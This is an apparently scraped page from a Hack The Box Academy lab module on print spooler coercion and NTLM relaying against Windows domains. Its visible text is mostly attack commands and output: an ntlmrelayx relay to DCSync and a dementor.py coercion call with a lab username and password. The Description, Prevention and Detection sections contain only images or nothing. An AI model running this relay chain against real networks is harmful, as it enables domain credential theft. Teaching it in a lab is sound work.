<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/176/section/1787
// Platform Version: V1
// Module ID: 176
// Module Name: Windows Attacks & Defense
// Module Difficulty: Medium
// Section ID: 1787
// Section Title: Print Spooler & NTLM Relaying
// Page Title: Windows Attacks & Defense
// Page Number: 12
-->

# Print Spooler & NTLM Relaying

**Module Name:** Windows Attacks & Defense **Page Number:** 12

#### WINDOWS ATTACKS & DEFENSE

# Print Spooler & NTLM Relaying

## Description

## Attack

``` shell-session
[!bash!]$ impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client SMTP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMB loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
```

![https://academy.hackthebox.com/storage/modules/176/A10/startntlmrelayx.png](https://academy.hackthebox.com/storage/modules/176/A10/startntlmrelayx.png)

``` shell-session
python3 ./dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123

[*] connecting to 172.16.18.3
[*] bound to spoolss
[*] getting context handle...
[*] sending RFFPCNEX...
[-] exception RPRN SessionError: code: 0x6ab - RPC_S_INVALID_NET_ADDR - The network address is invalid.
[*] done!
```

![https://academy.hackthebox.com/storage/modules/176/A10/dementor.png](https://academy.hackthebox.com/storage/modules/176/A10/dementor.png)

![https://academy.hackthebox.com/storage/modules/176/A10/hashes.png](https://academy.hackthebox.com/storage/modules/176/A10/hashes.png)

## Prevention

![https://academy.hackthebox.com/storage/modules/176/A10/registry.png](https://academy.hackthebox.com/storage/modules/176/A10/registry.png)

## Detection

![https://academy.hackthebox.com/storage/modules/176/A10/detectDCSync.png](https://academy.hackthebox.com/storage/modules/176/A10/detectDCSync.png)

## Honeypot

# 

# 

#### Questions

####